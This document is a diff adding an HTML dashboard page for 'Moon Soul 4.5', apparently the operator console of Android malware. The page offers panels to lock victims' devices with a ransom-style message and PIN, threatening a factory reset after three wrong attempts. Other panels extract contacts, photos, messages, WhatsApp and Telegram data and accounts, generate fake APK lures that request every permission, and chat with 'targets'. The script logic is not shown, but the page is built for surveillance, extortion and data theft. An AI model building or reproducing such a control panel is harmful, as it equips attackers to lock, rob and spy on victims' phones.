@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Moon Soul 4.5 - DASHBOARD</title>
+    <link rel="stylesheet" href="dashboard-style.css">
+</head>
+<body>
+    <div class="matrix-bg"></div>
+    
+    <div class="dashboard-container">
+        <div class="header">
+            <div class="header-title">
+                <h1>🌙 MOON SOUL 4.5</h1>
+                <p>DEVELOPER CONSOLE | <span id="devName">Moon4.5</span></p>
+            </div>
+            <div class="stats">
+                <div class="stat-item">
+                    <span class="stat-label">TARGETS ONLINE</span>
+                    <span class="stat-value" id="targetsOnline">0</span>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-label">ACTIVE LOCKS</span>
+                    <span class="stat-value" id="activeLocks">0</span>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-label">DATA EXFIL</span>
+                    <span class="stat-value" id="dataExfil">0 MB</span>
+                </div>
+            </div>
+        </div>
+        
+        <div class="main-grid">
+            <!-- Left Panel - Target List -->
+            <div class="panel targets-panel">
+                <div class="panel-header">
+                    <h2>🎯 ACTIVE TARGETS</h2>
+                    <button id="refreshTargets" class="small-btn">⟳</button>
+                </div>
+                <div class="target-list" id="targetList">
+                    <!-- Targets will be loaded here -->
+                    <div class="loading">LOADING TARGETS...</div>
+                </div>
+            </div>
+            
+            <!-- Middle Panel - Control Center -->
+            <div class="panel control-panel">
+                <div class="panel-header">
+                    <h2>⚡ EXECUTION CENTER</h2>
+                    <span class="badge" id="selectedTarget">NO TARGET</span>
+                </div>
+                
+                <div class="control-tabs">
+                    <button class="tab-btn active" data-tab="lock">🔒 LOCK</button>
+                    <button class="tab-btn" data-tab="data">📁 DATA</button>
+                    <button class="tab-btn" data-tab="apps">📱 APPS</button>
+                    <button class="tab-btn" data-tab="chat">💬 CHAT</button>
+                </div>
+                
+                <!-- Lock Device Tab -->
+                <div class="tab-content active" id="lock-tab">
+                    <h3>LOCK DEVICE CONTROL</h3>
+                    
+                    <div class="form-group">
+                        <label>LOCK MESSAGE</label>
+                        <textarea id="lockMessage" rows="3" placeholder="Enter message to display on target device...">⚠️ DEVICE LOCKED BY MOON SOUL ⚠️
+Contact admin to unlock</textarea>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>UNLOCK PIN</label>
+                        <input type="text" id="lockPin" placeholder="Set unlock PIN (6 digits)" value="123456">
+                    </div>
+                    
+                    <div class="button-group">
+                        <button id="activateLock" class="danger-btn">🔒 ACTIVATE LOCK</button>
+                        <button id="deactivateLock" class="secondary-btn" disabled>🔓 RELEASE LOCK</button>
+                    </div>
+                    
+                    <div class="info-box">
+                        <p>⚠️ 3 WRONG PIN ATTEMPTS = DEVICE FACTORY RESET ⚠️</p>
+                    </div>
+                </div>
+                
+                <!-- Data Extraction Tab -->
+                <div class="tab-content" id="data-tab">
+                    <h3>DATA EXTRACTION</h3>
+                    
+                    <div class="data-options">
+                        <label class="checkbox-label">
+                            <input type="checkbox" class="data-check" value="contacts"> Contacts
+                        </label>
+                        <label class="checkbox-label">
+                            <input type="checkbox" class="data-check" value="photos"> Photos
+                        </label>
+                        <label class="checkbox-label">
+                            <input type="checkbox" class="data-check" value="videos"> Videos
+                        </label>
+                        <label class="checkbox-label">
+                            <input type="checkbox" class="data-check" value="messages"> Messages
+                        </label>
+                        <label class="checkbox-label">
+                            <input type="checkbox" class="data-check" value="whatsapp"> WhatsApp
+                        </label>
+                        <label class="checkbox-label">
+                            <input type="checkbox" class="data-check" value="telegram"> Telegram
+                        </label>
+                        <label class="checkbox-label">
+                            <input type="checkbox" class="data-check" value="accounts"> All Accounts
+                        </label>
+                        <label class="checkbox-label">
+                            <input type="checkbox" class="data-check" value="files"> All Files
+                        </label>
+                    </div>
+                    
+                    <button id="extractData" class="action-btn">⬇️ EXTRACT SELECTED DATA</button>
+                    
+                    <div class="data-preview" id="dataPreview">
+                        <h4>PREVIEW:</h4>
+                        <pre>Select data to preview...</pre>
+                    </div>
+                </div>
+                
+                <!-- Fake Apps Tab -->
+                <div class="tab-content" id="apps-tab">
+                    <h3>GENERATE FAKE APK</h3>
+                    
+                    <div class="app-options">
+                        <button class="app-btn" data-app="aimlock">🎯 AIMLOCK PRO</button>
+                        <button class="app-btn" data-app="money">💰 PENGHASIL UANG</button>
+                        <button class="app-btn" data-app="whatsapp">💬 WHATSAPP TOOLS</button>
+                        <button class="app-btn" data-app="bug">🐛 BUG WHATSAPP</button>
+                        <button class="app-btn" data-app="game">🎮 GAME PENGHASIL UANG</button>
+                        <button class="app-btn" data-app="custom">⚙️ CUSTOM APK</button>
+                    </div>
+                    
+                    <div id="customAppConfig" style="display: none;">
+                        <input type="text" placeholder="APK Name" id="customAppName">
+                        <input type="text" placeholder="Package Name" id="customPackage">
+                        <input type="text" placeholder="Icon URL" id="customIcon">
+                    </div>
+                    
+                    <button id="generateApk" class="action-btn">📦 GENERATE FAKE APK</button>
+                    <p class="note">* APK akan meminta semua izin saat instalasi</p>
+                </div>
+                
+                <!-- Live Chat Tab -->
+                <div class="tab-content" id="chat-tab">
+                    <h3>LIVE CHAT WITH TARGET</h3>
+                    
+                    <div class="chat-messages" id="chatMessages">
+                        <div class="system-msg">[SYSTEM] Select target to start chat</div>
+                    </div>
+                    
+                    <div class="chat-input-area">
+                        <input type="text" id="chatInput" placeholder="Type message to target..." disabled>
+                        <button id="sendChat" disabled>📤 SEND</button>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Right Panel - Live Feed / Logs -->
+            <div class="panel logs-panel">
+                <div class="panel-header">
+                    <h2>📡 LIVE ACTIVITY LOG</h2>
+                    <button id="clearLogs" class="small-btn">🗑️</button>
+                </div>
+                <div class="log-container" id="logContainer">
+                    <div class="log-entry system">[SYSTEM] Moon Soul 4.5 initialized</div>
+                    <div class="log-entry system">[SYSTEM] Waiting for targets...</div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Firebase -->
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-storage.js"></script>
+    <script src="firebase-config.js"></script>
+    <script src="dashboard.js"></script>
+</body>
+                          </html>
